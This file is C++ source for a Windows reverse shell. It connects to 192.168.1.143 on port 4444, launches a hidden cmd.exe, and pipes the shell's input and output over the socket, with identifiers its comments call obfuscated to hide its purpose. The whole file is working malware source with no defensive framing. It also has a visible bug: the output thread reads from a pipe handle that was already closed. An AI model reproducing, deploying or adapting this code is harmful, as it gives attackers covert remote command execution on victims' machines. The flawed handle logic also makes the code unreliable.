#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define S0 "192.168.1.143"  // Hidden IP address using #define
#define P0 4444  // Hidden Port
#define C0 1024  // Buffer size (obfuscated)

// Obfuscated function names
DWORD WINAPI F1(LPVOID L0) {
    struct { SOCKET S1; HANDLE P1; } *A0 = (decltype(A0))L0;

    char B0[C0];
    DWORD R0;
    while (ReadFile(A0->P1, B0, sizeof(B0), &R0, NULL) && R0 > 0) {
        send(A0->S1, B0, R0, 0);
    }
    return 0;
}

DWORD WINAPI F2(LPVOID L0) {
    struct { SOCKET S1; HANDLE P1; } *A0 = (decltype(A0))L0;

    char B0[C0];
    int R0;
    DWORD W0;

    while ((R0 = recv(A0->S1, B0, sizeof(B0), 0)) > 0) {
        WriteFile(A0->P1, B0, R0, &W0, NULL);
    }
    return 0;
}

int main() {
    WSADATA D0;
    if (WSAStartup(MAKEWORD(2, 2), &D0) != 0) {
        std::cerr << "W0 Failed!" << std::endl;
        return 1;
    }

    SOCKET S2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in S3;
    S3.sin_family = AF_INET;
    S3.sin_port = htons(P0);
    inet_pton(AF_INET, S0, &S3.sin_addr);  // Obfuscated IP address

    if (connect(S2, (SOCKADDR*)&S3, sizeof(S3)) == SOCKET_ERROR) {
        std::cerr << "S2 Failed!" << std::endl;
        closesocket(S2);
        WSACleanup();
        return 1;
    }

    // Pipe handles, obfuscated variable names
    HANDLE P2, P3, P4, P5;
    SECURITY_ATTRIBUTES P6 = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    CreatePipe(&P4, &P5, &P6, 0);
    CreatePipe(&P2, &P3, &P6, 0);

    // Creating cmd.exe with hidden window
    STARTUPINFOA S4 = { 0 };
    PROCESS_INFORMATION P7 = { 0 };
    S4.cb = sizeof(S4);
    S4.dwFlags = STARTF_USESTDHANDLES;
    S4.hStdInput = P2;
    S4.hStdOutput = P4;
    S4.hStdError = P4;

    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &S4, &P7)) {
        std::cerr << "CMD Failed!" << std::endl;
        closesocket(S2);
        WSACleanup();
        return 1;
    }

    // Close unnecessary handles
    CloseHandle(P2);
    CloseHandle(P4);

    // Manually define the argument structure and create threads
    struct ThreadArgs {
        SOCKET sock;
        HANDLE pipe;
    };

    // Create the argument structures
    ThreadArgs* A1 = new ThreadArgs{ S2, P4 };
    ThreadArgs* A2 = new ThreadArgs{ S2, P3 };

    // Create threads for data transmission
    HANDLE T0 = CreateThread(NULL, 0, F1, A1, 0, NULL);
    HANDLE T1 = CreateThread(NULL, 0, F2, A2, 0, NULL);

    // Infinite loop to keep program running
    while (true) {
        // This keeps the process running without waiting for it to finish
        // We don't want it to exit or terminate unless the connection is closed
        Sleep(1000);  // Optional: Sleep to reduce CPU usage, adjust as necessary
    }

    // Cleanup (won't be reached unless program is terminated)
    CloseHandle(P7.hProcess);
    CloseHandle(P7.hThread);
    closesocket(S2);
    WSACleanup();
    return 0;
}
